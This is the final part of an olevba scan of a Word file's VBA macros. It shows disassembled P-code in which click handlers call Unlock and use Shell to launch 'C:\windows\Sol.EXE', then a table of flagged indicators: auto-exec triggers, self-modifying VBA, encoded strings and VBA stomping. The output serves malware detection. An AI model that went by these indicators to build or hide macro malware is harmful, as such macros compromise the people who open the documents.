' 	MemSt Caption 
' Line #71:
' 	EndSub 
' Line #72:
' 	FuncDefn (Private Sub Jiuster2_Click())
' Line #73:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Private Sub Jiuster1_Click())
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' 	Dim 
' 	VarDefn retval
' Line #78:
' 	LitStr 0x0012 "C:\windows\Sol.EXE"
' 	LitDI2 0x0001 
' 	ArgsLd Shell 0x0002 
' 	St retval 
' Line #79:
' 	EndSub 
' Line #80:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Jiuster2_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Sol.EXE             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

